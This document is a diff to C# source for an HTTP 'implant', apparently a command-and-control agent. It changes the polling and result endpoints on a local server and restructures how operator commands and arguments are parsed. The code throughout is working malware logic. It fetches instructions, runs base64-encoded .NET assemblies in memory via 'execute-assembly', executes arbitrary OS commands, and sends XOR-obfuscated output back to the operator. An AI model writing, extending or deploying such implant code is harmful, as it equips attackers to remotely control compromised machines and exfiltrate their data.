@@ -33,11 +33,12 @@ namespace HTTPImplant
                 {
                     try
                     {
-                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
+                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/getCommand"));
                         Console.WriteLine("Getting instructions...");
                         Command command = new Command();
                         command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
-                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
+                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
+                        command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                         command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                         command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
@@ -45,28 +46,27 @@ namespace HTTPImplant
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
                         command.NullTerm = jsonResponse.Split(new string[] { "\"nullterm\":\"", "\"}" }, StringSplitOptions.None)[1];
 
-                        Console.WriteLine("Got: " + command.Input);
+                        Console.WriteLine($"Input: {command.Input}, Command: {command.command}");
+
                         await Task.Delay(5000);
 
                         if (command.command != lastCommandExecuted) {
                             lastCommandExecuted = command.command;
-                            continue;
                         }
 
                         else if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
                         {
+                            Console.WriteLine("Running assembly");
                             byte[] bytes = Convert.FromBase64String(command.File);
                             string output = ExecuteAssembly.Execute(bytes);
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                             Console.WriteLine(output);
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
-                        else if (command.Input.Trim().Equals("internal", StringComparison.OrdinalIgnoreCase))
+                        else if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
                         {
-                            string[] result = command.command.Split(new string[] { " " }, StringSplitOptions.None);
-                            string opCommand = result[0];
-                            string args = result[1];
-                            string output = Commands.command(opCommand, args);
+                            Console.WriteLine("Running command: " + command.command);
+                            string output = Commands.command(command.command, command.Args);
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
@@ -112,7 +112,7 @@ namespace HTTPImplant
             byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);
 
             string data = Convert.ToBase64String(encryptedResultJson);
-            await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", data);
+            await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/postOutput"), "POST", data);
         }
 
         public static byte[] XOR(byte[] data, byte[] key)
@@ -131,12 +131,13 @@ namespace HTTPImplant
     public class Command
     {
         public string Input { get; set; }
+        public string command { get; set; }  // Renamed to avoid conflict with class name
+        public string Args { get; set; }
         public string ImplantUser { get; set; }
         public string Operator { get; set; }
         public string TimeToExec { get; set; }
         public string Delay { get; set; }
         public string File { get; set; }
-        public string command { get; set; }
         public string NullTerm { get; set; }
     }
 }
